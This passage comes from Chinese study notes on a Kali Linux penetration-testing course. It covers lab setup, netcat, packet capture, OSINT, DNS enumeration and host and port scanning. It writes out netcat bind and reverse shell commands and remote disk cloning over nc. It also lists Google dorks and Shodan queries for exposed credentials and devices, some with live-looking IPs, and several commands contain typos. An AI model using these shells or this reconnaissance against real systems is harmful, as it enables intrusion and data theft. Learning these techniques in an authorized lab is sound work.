表示链接,相当于快捷方式 c表示设备 -b 表示块设备</li></ul></li><li>ls -a: </li><li>ls -lh:以k显示</li><li>ls -lh –sort==size 进行排序</li></ul></li><li>cd:进入目录<ul><li>cd . 表示当前目录</li><li>cd .. 进入上一级目录</li><li>pwd 当前工作目录</li><li>cd  进入用户主目录</li></ul></li><li>cat:查看文件内容</li><li>more:会显示文件的百分比数</li><li>less</li><li>tail 文件: 显示文件最后几行</li><li>watch -n  t [命令] 每隔t秒查看信息</li><li>rm:删除文件</li><li>cp:拷贝命令 cp ps ps1</li><li>top:监视linux系统性能的命令</li><li>ps:查看进程信息<ul><li>ps aux</li></ul></li><li>grep:grep [文件字符串或者需要的内容] 文件位置</li><li>ifconfig:查看网络信息<ul><li>ifconfig eth0 down 将网卡宕掉</li><li>ifconfig eth0 up   重新启动网卡</li></ul></li><li>netstat:查看网络连接信息<ul><li>netstat -pautu: 进行网络连接信息</li></ul></li><li>awk</li><li>管道:可对信息进行筛选,管道亦有很多命令(需掌握)</li><li>mount:用来挂载的命令</li><li>dmesg:查看msg文件内容</li><li>find: <ul><li>find / -nmap nmap 查找文件</li><li>find . [文件] 查找当前目录中的文件 </li></ul></li><li>whereis [文件] -b [查找二进制执行文件]</li><li>echo:显示当前文件</li><li>man指令:相当于手册</li></ul></blockquote><blockquote><p>vi编辑器基本使用(后续补充)</p></blockquote><ul><li>: set nu 显示行号</li><li>: wq     保存退出<blockquote><p>管道(后续补充)</p></blockquote></li><li>| 管道符</li><li>||</li><li>&amp; 前后两个命令依次执行</li><li>&amp;&amp; 逻辑与会有逻辑短路现象</li></ul><blockquote><p>shell脚本(后续补充)   </p></blockquote><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo -n &quot;IP : &quot;</span><br><span class="line">read ip</span><br><span class="line">echo &quot;your ip is:&quot; $ip</span><br><span class="line"></span><br><span class="line"># 使用 chmod +x 文件名.sh 更改权限</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 实现9*9乘法表</span><br><span class="line">for n in &apos;seq 9&apos;</span><br><span class="line">do</span><br><span class="line">for m in &apos;seq &amp;n&apos;</span><br><span class="line">  do </span><br><span class="line">    echo -n &quot;$m*$n=&quot; &apos;expr $m \* &amp;n&apos;&quot;  &quot;</span><br><span class="line">  done</span><br><span class="line">  echo</span><br><span class="line">done</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 循环发现所有活的ip地址</span><br><span class="line">for n in &apos;seq 254&apos;</span><br><span class="line">do </span><br><span class="line">  # -c 表示只ping一个包 awk 指定第四列,对应的是ip地址</span><br><span class="line">  ping 192.168.1.$n -c 1 | grep ttl | awk &apos;&#123;print $4&#125;&apos; | awk -F &apos;&#123;print $1&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="Kali-Linux-从入门到精通-三-入侵系统定制"><a href="#Kali-Linux-从入门到精通-三-入侵系统定制" class="headerlink" title="Kali Linux 从入门到精通(三)-入侵系统定制"></a>Kali Linux 从入门到精通(三)-入侵系统定制</h2><blockquote><p>定制</p></blockquote><ul><li><p>网络配置</p><ul><li>临时IP地址<ul><li>dhclient eth0</li><li>ifconfig eth0 192.168.11/24</li><li>route add default gw 192.168.1.1  # 添加默认网关</li><li>echo nameserver 192.168.1.1 &gt; /etc/resolv.conf</li></ul></li><li>固定IP地址(计算机重启后依然生效)<ul><li>auto th0</li><li>iface th0 inel stalic</li><li>address 192.168.20.1</li><li>netmask 255.255.255.0</li><li>network 192.168.20.255</li><li>broadcast 192.168.20.255</li><li>gateway  192.168.20.2</li><li>dns-nameservers 192.168.1.1 192.168.1.2</li><li>up route add -net 172.16.5.0 gw 192.168.10.100 eth1</li><li>down route del -net 172.24.0.0/24</li></ul></li></ul></li><li><p>更新升级</p><ul><li>apt-get update: 实际上是更新的是包的索引文件</li><li>apt-get upgrade: 实际更新包的指令</li></ul></li><li><p>安装软件包</p><ul><li>库<ul><li>apt-get 命令</li></ul></li><li>安装适合自己的工具软件<ul><li>apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs-y</li></ul></li></ul></li><li><p>浏览器插件</p><ul><li>firefox浏览器插件<ul><li>flashgof(基于浏览器插件的下载插件),autoproxy(翻墙插件),Tamper Data(提交修改),cooike,importer,Cookies Manager,Download Youtube Videos as MP4,Firebug,Flagfox(显示服务器位置),HackBar(F9进入操作),hashr(计算Hash值),User Agent Switcher(修改User Agent 可用于欺骗服务器),XSS me,SQL Inject Me</li></ul></li><li>xss-me:<a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></li><li>sql-inject-me: <a href="https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss" target="_blank" rel="noopener">https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss</a></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-四-代理"><a href="#Kali-Linux-从入门到精通-四-代理" class="headerlink" title="Kali Linux 从入门到精通(四)-代理"></a>Kali Linux 从入门到精通(四)-代理</h2><ul><li><p>翻墙&amp;代理</p><ul><li><p>GFW长城防火墙</p><ul><li>Facebook,youtube</li></ul><p>client–&gt;goagent–&gt;GAE–&gt;目标网站               </p></li><li><p>翻墙</p><ul><li>http代理:明文传输存在弊端,容易被长城防火墙发现容量,现在可以使用https进行加密</li><li>socks代理</li><li>ssh代理</li><li>VPN</li></ul></li><li><p>Goagent</p></li><li><p>Tor:暗网</p><ul><li>保护隐私防止被追踪</li><li>志愿者组成</li><li>长期在天朝无法使用<ul><li>感谢云</li></ul></li><li>暗网<ul><li>互联网引擎无法发现</li><li>互联网黑市</li></ul></li></ul></li></ul></li></ul><ul><li>代理的意义所在<ul><li>加密通信</li><li>隐藏来源</li><li>突破网络封锁</li></ul></li><li>注意事项<ul><li>不要触及敏感地带</li><li>不要从事非法行为</li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-五-测试环境准备"><a href="#Kali-Linux-从入门到精通-五-测试环境准备" class="headerlink" title="Kali Linux 从入门到精通(五)-测试环境准备"></a>Kali Linux 从入门到精通(五)-测试环境准备</h2><blockquote><p>准备实验环境</p></blockquote><ul><li><p>渗透非系统授权的弊端</p></li><li><p>搭建自己的实验环境</p><blockquote><p>安装虚拟机</p></blockquote></li><li><p>微软最新软件</p><ul><li><a href="http://msdn.microst.com/en-ca/subscriptions/aa336858" target="_blank" rel="noopener">http://msdn.microst.com/en-ca/subscriptions/aa336858</a></li></ul></li><li><p>windows虚拟机 </p><ul><li><a href="http://dev.modern.ie/tools/vms" target="_blank" rel="noopener">http://dev.modern.ie/tools/vms</a></li></ul></li><li><p>安装自己的虚拟机(windows平台)</p><ul><li>xp</li><li>Win7</li><li>2003</li></ul></li><li><p>Linux虚拟机</p><ul><li><p><a href="http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试)" target="_blank" rel="noopener">http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试)</a></p></li><li><p>Ubutu  </p><ul><li>Lamp安装<ul><li>sudo apt-get install ssh</li><li>sudo apt-get install apache2</li><li>sudo apt-get install apache2-utile/</li><li>sudo service apache2 restart(报错解决: vi /etc/apache2/conf-available/fqdn.conf:ServerName:localhost)</li><li>sudo apt-get nstall mysql-server libapache2-mod-auth-mysql php5-mysql</li><li>mysql install db</li><li>mysql secure installation</li><li>sudo apt-get install php5 php5-mysql</li><li>cd /var/www/html</li><li>vi test.php</li><li>sudo init 0 关机</li><li>sudo init 6 重启</li><li>sudo init 1 单用户</li><li>sudo init 2-5 多用户</li></ul></li></ul></li><li><p>Metasploitable2(务必下载)</p><ul><li><a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a><ul><li>默认账户:msfadmin</li><li>查看ip:ifconfig</li></ul></li><li>问题: /var/www/multilldae/config.inc<ul><li>解决措施: <ul><li>cd /var/www/mutillidae/</li><li>vi config.inc<ul><li>$dbname=”owasp10”:^n   </li></ul></li></ul></li></ul></li></ul></li><li><p>模拟真实网络</p><ul><li><p>M0n0wall 防火墙</p><ul><li><a href="http://m0n0.ch/wall/downloads.php" target="_blank" rel="noopener">http://m0n0.ch/wall/downloads.php</a> (轻量级防火墙 downloads cdrom)</li></ul></li><li><p>部署:</p><ul><li>接外网,内网,DMZ区</li><li>256MB,8GB硬盘 m0n0虚拟机</li><li>网卡1: 桥接方式网络,连接物理网络,桥接外网 </li><li>网卡2: 仅主机,虚拟网卡</li><li>网卡3: 同网卡2</li><li>无挂载,硬盘重启</li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36t9AI.png" alt="36t9AI.png"></p><ul><li>背靠背防火墙(测试复杂网络架构 模拟高级企业网络拓扑)<ul><li>Pfense(安全性高,集成大量安全插件,防护dmz)</li><li><a href="http://pfense.org/" target="_blank" rel="noopener">http://pfense.org/</a>  (类似于m0n0)</li></ul></li></ul><p><img src="https://s2.ax1x.com/2020/02/29/36teBj.png" alt="36teBj.png"></p></li></ul></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-五-基本工具使用"><a href="#Kali-Linux-从入门到精通-五-基本工具使用" class="headerlink" title="Kali Linux 从入门到精通(五)-基本工具使用"></a>Kali Linux 从入门到精通(五)-基本工具使用</h2><blockquote><p>基本工具</p></blockquote><ul><li><p>常用工具:</p><ul><li><p>经常使用且功能强大</p></li><li><p>安全从业者必不可少的帮手</p></li><li><p>Nc/ncat</p></li><li><p>Wireshark</p></li><li><p>Tcpdump</p><blockquote><p>NETCAT-NC(瑞士军刀)</p><ul><li>基本介绍      </li><li>网络工具中的瑞士军刀-小身材,大智慧</li><li>侦听模式/传输模式</li><li>telnet/获取banner模式</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所用流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li><li>一波操作</li><li>NC-TELNET/BANNER</li><li>nc-nv 1.1.1.1 110 (pop3 服务器)</li><li>nc-nv 1.1.1.1 25  (smtp 邮件服务器)</li><li>nc-nv 1.1.1.1 80  (网站)</li><li>nc -h 查看nc可用参数</li><li>NC-传输文本信息</li><li>A:nc -l -p 4444(打开4444端口)  使用netstat -pantu | grep 4444 查看端口是否打开</li><li>B:nc -nv 1.1.1.1 4444</li><li>nc -q 传输后直接断连接</li><li>远程电子取证信息收集</li><li>NC-传输文件/目录</li><li>传输文件</li><li>A:nc -lp 333&gt;test.mp4</li><li>B:nc -nv 1.1.1.1 333 &lt; test.mp4 -q 1</li><li>or</li><li>A: nc-q l -lp 333&lt;a.mp4</li><li>B: nc-nv 1.1.1.1 333&gt;2.mp4</li><li>传输目录</li><li>A:tar -cvf -music/ | nc-lp 333 -q 1</li><li>B:nc -nv 1.1.1.1 333 | tar -xvf -</li><li>加密传文件</li><li>A:nc -lp 333 | mcrypt -flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li><li>B:mcrypt –flush -Fbq -a rjindael-256-m ecb &lt;a.mp4 | nc -nv 1.1.1.1 333 -q 1(对称加密算法)</li><li>NC-流媒体服务</li><li>A:cat 1.mp4 | nc -lp 333</li><li>B:nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li><li>NC-端口扫描</li><li>nc -nvz 1.1.1.1-65535  (探测tcp端口)</li><li>nc -nvzu 1.1.1.1-1024  (探测udp端口)</li><li>NC-远程克隆硬盘</li><li>A(接收端):nc -lp 333 | dd of=/dev/sda</li><li>B(被取证电脑):dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</li><li>远程电子取证,可以将目标服务器远程复制,或者内存</li><li>NC-远程控制</li><li>正向:<ul><li>A(服务器):nc -lp 333 -c bash</li><li>B(客户端):nc 1.1.1.1 333</li></ul></li><li>反向:<ul><li>A:nc -lp 333</li><li>B:nc 1.1.1.1 333 -c bash</li></ul></li><li>注:windows用户把bash改成cmd</li><li>适用于内网访问外网</li><li>NC-NCAT</li><li>NC缺乏加密和身份验证(肉鸡可能被窃取)的能力</li><li>Ncat包含于nmap工具包中(可实现加密,身份验证,每次会重新生成指纹信息)</li><li>A:ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</li><li>B:ncat -nv 1.1.1.1 333 –ssl</li></ul></blockquote><ul><li>不同系统/平台的nc参数功能不尽相同</li></ul></li></ul></li></ul><blockquote><p>WIRESHARK(后续补充)-被动扫描大法</p><ul><li>基本介绍<ul><li>抓包嗅探协议分析</li><li>安全专家必备的技能</li><li>抓包引擎<ul><li>Libcap9—-Linux</li><li>Winpcap10—Windows</li></ul></li><li>解码能力(评价之根本) </li></ul></li><li>基本使用方法<ul><li>启动</li><li>选择抓包网卡</li><li>混杂模式</li><li>实时抓包</li><li>保存和分析捕获文件</li><li>首选项</li></ul></li><li>WIRESHARK-筛选器<ul><li>过滤掉干扰的数据包</li><li>抓包筛选器</li><li>显示筛选器 </li></ul></li><li>WIRESHARK-常见协议包<ul><li>数据的分层结构</li><li>ARP</li><li>ICMP</li><li>TCP(三次握手)</li><li>UDP</li><li>DNS</li><li>HTTP(明文协议)</li><li>FTP</li></ul></li><li>WIRESHARK-TCP<ul><li>数据流<ul><li>HTTP</li><li>SMTP</li><li>POP3</li><li>SSL</li></ul></li></ul></li><li>WIRESHARK-信息统计<ul><li>节点数</li><li>协议分布</li><li>包大小分布</li><li>会话连接</li><li>解码方式</li><li>专家系统</li></ul></li><li>WIRESHARK-实践<ul><li>抓包对比nc,ncat加密与不加密的流量</li><li>企业抓包部署方案(采用商业化软件)<ul><li>Sniffer</li><li>Cace/riverebed (底层基于wireshark)</li><li>Cascad pilot(大流量抓包++)   </li><li>镜像端口(Cisco)<br>TCPDUMP</li><li>基本介绍</li><li>No-GUI的抓包分析工具</li><li>Linux,Unix系统默认安装</li><li>TCPDUMP-抓包</li><li>抓包</li><li>默认只抓68个字节</li><li>tcpdump -i eth0 -s 0 -2 file.pcap</li><li>tcpdump -i eth0 port 22</li><li>读取抓包文件</li><li>tcpdump -r file.pcap</li><li>TCPDUMP-筛选</li><li>tcpdump -n http.cap | awk ‘{print $3}’ | sort -u </li><li>tcpdump -n src host [ip address] -r http.cap</li><li>tcpdump -n dst host [ip address] -r http.cap</li><li>tcpdump -n port 53 -r http.cap</li><li>tcpdump -nX port 80 -r http.cap</li><li>TCP 高级筛选</li><li>tcpdump -A -n ‘tcp[13]=24’ -r http.cap</li><li>过程文档记录</li><li>Dradis(Kali 自带)</li><li>短期临时小团队资源共享</li><li>各种插件导入问价</li><li>Keepnote </li><li>Truecrypt(注重信息保密)</li><li>团队中需要文档人员</li></ul></li></ul></li></ul></blockquote><h2 id="Kali-Linux-从入门到精通-七-被动信息收集"><a href="#Kali-Linux-从入门到精通-七-被动信息收集" class="headerlink" title="Kali Linux 从入门到精通(七)-被动信息收集"></a>Kali Linux 从入门到精通(七)-被动信息收集</h2><blockquote><p>被动信息收集</p><ul><li>公开渠道可获得的信息</li><li>与目标系统不产生直接交互</li><li>尽量避免留下一切痕迹</li><li>OSINT<ul><li>美国军方</li><li>北大西洋公约组织<ul><li>Passive reconnaissance(no direct interaction)</li><li>normal interaction</li><li>Active reconnaissance</li><li>More information greater chance of direction<br>信息收集内容</li></ul></li></ul></li><li>IP地址段</li><li>域名信息</li><li>邮件地址</li><li>文档图片数据</li><li>公司地址</li><li>公司组织架构</li><li>联系电话/传真号码</li><li>人员姓名/职位</li><li>目标系统使用的技术架构</li><li>公开的商业信息<br>信息用途</li><li>用信息描述目标</li><li>发现</li><li>社会工程学攻击</li><li>物理缺口</li></ul></blockquote><blockquote><p>信息收集-DNS</p><ul><li>域名与FQDN的区别<ul><li>sina.com 实际域名</li><li><a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> 完全限定域名 简称为FQDN</li></ul></li><li>域名记录:A(主机记录),Cname(解析成另外一个域名) NS(域的域名服务器记录),MX(邮件交换记录),ptr(不同于前面,通过ip地址解析域名 反向域名 解析)<ul><li>递归查询</li><li>迭代查询<br>DNS信息收集–NSLOOKUP<ul><li>nslookup <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li><li>server</li><li>type=a,mx,ns,any</li><li>nslookup -type example.com 156.154.70.22</li><li>text:spf 通过反向域名查询,判断,从而反垃圾邮件<br>DNS信息收集-DIG</li><li>dig @8.8.8.8 <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> mx</li><li>dig <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> any</li><li>反向查询: dig +noall +answer -x 8.8.8.8</li><li>bind版本信息:dig +noall +answer txt chaos VERSION.BAND @ns3.dnsv4.com</li><li>DNS追踪: dig +trace example.com</li><li>抓包比较递归查询,迭代查询过程的区别<br>DNS区域传输</li><li>dig @nsl.example.com example.com axfr</li><li>host -T -l sina.com 8.8.8.8<br>DNS 字典爆破</li><li>firece -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt</li><li>dnsdict6 -d4 -t 16 -x sina.com</li><li>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</li><li>dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt</li><li>dnscrecon -t std -d sina.com<br>DNS 注册信息</li><li>whois</li><li>whois -h whois.apnic.net 192.0.43.10</li><li>AFRINIC</li><li>APNIC</li><li>ARIN</li><li>IANA</li><li>ICANN</li><li>LACNIC</li><li>NRO</li><li>RIPE</li><li>InterNic<br>搜索引擎</li><li>公司新闻动态</li><li>重要雇员信息</li><li>机密文档/网络拓扑</li><li>用户名密码</li><li>目标系统软硬技术架构<br>SHODAN</li><li>搜索联网的设备</li><li>Banner:http,ftp,ssh,telnet</li><li><a href="https://www,shodan.io/" target="_blank" rel="noopener">https://www,shodan.io/</a></li><li>常见filter:</li><li>net (192.168.20.1)</li><li>city</li><li>country(CN,US)</li><li>port(80,21,22,23)</li><li>os</li><li>Hostname(主机或域名)</li><li>server </li><li>200 OK cisco country:IP</li><li>user:admin pass:password</li><li><a href="http://1.179.177.109:81/index.htm" target="_blank" rel="noopener">http://1.179.177.109:81/index.htm</a></li><li>linux upnp avtech<ul><li><a href="http://75.69.59.49:8000" target="_blank" rel="noopener">http://75.69.59.49:8000</a></li></ul></li><li><a href="https://account.shodan.io/" target="_blank" rel="noopener">https://account.shodan.io/</a></li><li><a href="https://www.shodan.io/explore" target="_blank" rel="noopener">https://www.shodan.io/explore</a></li><li>Add-Ons<br>Google 搜索</li><li>+ 充值 - 支付</li><li>北京的电子商务公司—北京 intitle:电子商务 intext 法人 intext 电话</li><li>阿里网站上的北京公司联系人-北京 site:alibaba.com inurl:contact</li><li>塞班司法案的PDF文档-SOX filetype.pdf</li><li>法国的支付相关页面-payment site:fr</li><li>Google搜索实例<ul><li>input:”level/15/exec/~/show”(交换机)</li><li>intitle:”netbotz appliance””ok”(摄像头)</li><li>inurl /admin/login.php(php登录界面 可爆破)</li><li>inurl:qq.txt(qq号)</li><li>filetype:xls “username | password”</li><li>input:ftp “password” filetype:xls site:baidu.com(ftp)</li><li>inurl:Service.pwd(微软漏洞)</li></ul></li></ul></li></ul></li></ul></blockquote><pre><code>- http://exploit-db.com/google-dorks(谷歌黑客数据库)(google hacking)- 不同浏览器都有其特有的搜索语法,需熟悉</code></pre><blockquote><p>YANDEX</p></blockquote><ul><li>世界第四大搜索引擎-俄罗斯</li><li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li><li>偶尔有惊喜<blockquote><p>用户信息</p></blockquote></li><li>邮件,主机<ul><li>theharvester -d sina.com -l 300 -b google</li></ul></li><li>文件<ul><li>metagoofill -d microsoft.com -t pdf -l 200 -o test -f 1.html</li></ul></li></ul><blockquote><p>MELTAGO(收集信息)</p><ul><li>申请账号</li><li>登录使用<br>其他路径</li><li>社交网络</li><li>工商注册</li><li>新闻组/论坛</li><li>招聘网站</li><li><a href="http://www.archive.org/web/web.php(可查看不同年份的网站代码)" target="_blank" rel="noopener">http://www.archive.org/web/web.php(可查看不同年份的网站代码)</a><br>个人专属的密码字典</li><li>按个人信息生成其专属的密码字典</li><li>CUPP-Common User Password Profiler<ul><li>git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a></li><li>python cup.py -i<br>METADATA</li></ul></li><li>Exif图片信息(图片会记录GPS信息 默认打开)</li><li>Foca</li></ul></blockquote><blockquote><p>RECON-NG</p><ul><li>全特性的web侦查框架</li><li>基于Python开发</li><li>web 信息搜索框架</li><li>命令格式与msf一致</li><li>基于Python开发</li><li>使用方法:<ul><li>模块</li><li>数据库</li><li>报告</li></ul></li><li>DNS查询<ul><li>Google</li><li>Baidu</li><li>Bing</li><li>Yahoo</li><li>Brute force</li></ul></li><li>解析IP地址(查询数据库)</li><li>联系人</li><li>报告 </li><li>API</li></ul></blockquote><h2 id="Kali-Linux-从入门到精通-八-主动信息收集"><a href="#Kali-Linux-从入门到精通-八-主动信息收集" class="headerlink" title="  Kali Linux 从入门到精通(八)-主动信息收集"></a>  Kali Linux 从入门到精通(八)-主动信息收集</h2><blockquote><p>基本介绍 </p><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准本</li><li>使用噪声迷惑目标,淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测,根据返回结果判断目标状态<br>发现<ul><li>识别活着的主机</li></ul></li><li>潜在的被攻击目标<ul><li>输出一个IP地址列表</li><li>2,3,4层发现<br>二层发现(渗透进目标系统后,发现内网其他信息)</li></ul></li></ul></li><li>优点:扫描速度快,可靠</li><li>缺点:不可路由</li><li>Arp协议:抓包<br>二层发现–arping命令:<ul><li>arping</li><li>arping 1.1.1.1 -c 1</li><li>arping 1.1.1.1 -d   (发现重复响应, 两个不同的MAC地址拥有同一个IP,而此时IP为网关地址,此时即为ARP欺骗,实现中间人攻击,窃取密码,篡改数据等恶意参数)</li><li>arping -c 1.1.1.1 | grep “bytes from” | cut -d”” -f 5 | cut -d “(“ -f 2 | cut -d”)” -f 1</li><li>脚本 <ul><li>arping1.sh eth0 &gt; addr</li><li>arping2.sh addrs<br>二层发现–nmap 在二层发现中的应用</li></ul></li></ul></li><li>nmap 1.1.1.1-254 -sn(可进行网段扫描 -sn表示不进行网段扫描)</li><li>nmap -iL iplist.txt -sn(可对文本文件进行扫描)</li><li>nmap很强大 后面单独介绍</li></ul></blockquote><blockquote><p>二层发现–Netdiscover</p><ul><li>专用于二层发现</li><li>可用于无线和交换环境</li><li>主动和被动探测<ul><li>主动<ul><li>netdiscover -i eth0 -r 1.1.1.0/24</li><li>netdiscover -l iplist.txt</li></ul></li><li>被动<ul><li>netdiscover -p   (将网卡置于混杂模式)</li><li>主动arp容易触发报警(入侵检测系统触发报警)<br>二层发现–Scapy </li></ul></li></ul></li><li>作为Python库进行调用</li><li>也可作为单独的工具使用</li><li>抓包,分析,创建.修改,注入流量</li><li>apt-get install python-gnuplot(处理报警信息)</li><li>Scapy<ul><li>ARP().display()</li><li>Sr1()</li></ul></li><li>Python 脚本<ul><li>Arp1.py<ul><li>subprocess:调用操作系统</li></ul></li><li>Arp2.py<br>发现-三层发现</li></ul></li><li>优点<ul><li>可路由</li><li>速度比较快</li></ul></li><li>缺点<ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li>IP,ICMP协议<br>三层发现-PING命令 </li><li>Ping 1.1.1.1 -c 2</li><li>Ping -R 1.1.1.1 / tracetoute 1.1.1.1</li><li>Ping 1.1.1.1 -c 1 | grep “bytes from” | cut -d” “ -f 4 | cut -d “:” -f 1</li><li>脚本<br> Ping.sh 1.1.1.0<br>三层发现-Scapy</li><li>OSI多层堆叠 手工生成ICMP包/ICMP</li><li>ip=IP()</li><li>ip.dst=”1.1.1.1”</li><li>ping=ICMP()</li><li>a=sr1(ip/ping)</li><li>a.display()</li><li>Ping 不存在的地址<ul><li>a=sr1(ip/icmp.timeout=1)</li></ul></li><li>a=sr1(IP(dst=”1.1.1.1”)/ICMP().timeout=1)</li><li>脚本<br>三层发现-nmap</li><li>nmap -sn 1.1.1.1-255</li><li>nmap -iL iplist.txt -sn<br>三层发现-fping</li><li>fping 1.1.1.1 -c 1</li><li>fping -g 1.1.1.1 1.1.1.2</li><li>fping -g 1.1.1.0/24</li><li>fping -f iplist.txt<br>三层发现-Hping</li><li>能够发送几乎所有TCP/IP包</li><li>功能强大但每次只能扫描一个目标:(</li><li>hping3 1.1.1.1 -icmp -c 2</li><li>for addr in$(seq 1 254):do hping3 1.1.1.$addr –icmp -c 1 &gt;&gt; handle.txt &amp; done<br>发现-四层发现</li><li>优点:<ul><li>可路由且结果可靠</li><li>不太可能被防火墙过滤</li><li>甚至可以发现所有端口都被过滤的主机</li></ul></li><li>缺点:<ul><li>基于状态过滤的防火墙可能过滤扫描</li><li>全端口扫描速度慢</li></ul></li><li>TCP<ul><li>未经过请求的ACK-RST(可用于判断主机是否存活)</li><li>SYN-SYN/ACK,RST</li></ul></li><li>UDP<ul><li>ICMP端口不可达,一去不复返<br>四层发现–Scapy(TCP发现)</li></ul></li><li>ACK-TCP Port–RST</li><li>Scapy<ul><li>i=IP()</li><li>i.dst=”<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a></li><li>t=TCP()</li><li>t.flags=’A’</li><li>r=(i/t)</li><li>a=sr1(r)</li><li>a.display()</li></ul></li><li>a=sr1(IP(dst=”<a href="http://www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1" target="_blank" rel="noopener">www.baidu.com&quot;)/TCP(dport=80,flags=&#39;A&#39;),timeout=1</a>))</li><li>ACK_Ping.py<br>四层发现–Scapy(UDP发现)</li><li>UDP-UDP Port-ICMP</li><li>i=IP()</li><li>u=UDP()</li><li>u.dport=33333</li><li>r=(i/u)</li><li>a=sr1(r.timeout=1,verbose=1)</li><li>A.display()<ul><li>ICMP</li></ul></li><li>UDP_Ping.py<ul><li>UDP发现不可靠<br>四层发现-nmap</li></ul></li><li>nmap 1.1.1.1-254 -PU53 -sn</li><li>nmap 1.1.1.1-254 -PA80 -sn</li><li>nmap -iL iplist.txt -PA80 -sn<br>四层发现</li><li>hping3 -udp 1.1.1.1 -c 1</li><li>for addr in $(seq 1,254); do hping3 -udp 1.1.1.$addr -c 1 &gt;&gt; r.txt; done<ul><li>grep Unreachable.txt | cut -d” “ -f 5 | cut -d “=” -f 2</li><li>./udp_hping.sh 1.1.1.0</li></ul></li><li>hping3 1.1.1.1 -c 1 (TCP)<ul><li>hping3 1.1.1.1</li><li>./TCP_hping.sh</li><li>Flag 0–ACK.RST<br>端口扫描<ul><li>端口对应网服务及应用端程序</li><li>服务端程序的漏洞通过端口攻入</li><li>发现开发的端口</li><li>更具体的攻击面</li><li>攻击流程:发现活的IP-&gt;发现开发端口-&gt;通过端口漏洞攻入<br>端口扫描之UDP端口扫描</li><li>假设ICMP port-unreachable 响应代表端口关闭</li></ul></li><li>目标系统不响应ICMP port-unreachable时,可能产生误判<ul><li>完整的UDP应用层请求</li></ul></li><li>准确性高</li><li>耗时巨大<ul><li>具体操作</li><li>Scapy UDP Scan<ul><li>端口关闭:ICMP port-unreacheable</li><li>端口开放:没有回包</li><li>了解每一种基于UDP的应用层结构很有绷住</li><li>与三层相同的技术</li><li>误判</li></ul></li><li>Scapy <ul><li>sr1(IP(dst=”1.1.1.1”)/UDP(dport=53).timeout=1,verbose=1)</li></ul></li><li>./udp_scan.py 1.1.1.1 1 100<br>端口扫描(UDP)-nmap</li><li>Nmap</li><li>nmap -sU 1.1.1.1</li><li>默认的1000个参数</li><li>ICMP host-unreachable</li><li>nmap 1.1.1.1 -sU -p 53</li><li>nmap -iL iplist.txt -sU -p 1-220</li></ul></li></ul></li></ul></blockquote><blockquote><p>端口扫描(TCP)-nmap</p><ul><li>TCP 端口扫描<ul><li>基于连接的协议</li><li>三次握手<br><img src="https://s2.ax1x.com/2020/03/01/3ceOHS.png" alt="3ceOHS.png"></li><li>隐蔽扫描–syn<ul><li>不建立完整连接</li><li>应用日志不记录扫描行为-隐蔽</li></ul></li></ul></li></ul></blockquote><pre><code>- 僵尸扫描- 端口开放状态: ![3cm9cq.png](https://s2.ax1x.com/2020/03/01/3cm9cq.png)- 端口状态 ![3cmCj0.png](https://s2.ax1x.com/2020/03/01/3cmCj0.png)    - 极度隐蔽    - 实施条件苛刻    - 可伪造源地址    - 选择僵尸机       - 闲置系统       - 系统使用递增的IPID          - 0          - 随机- 全连接扫描- 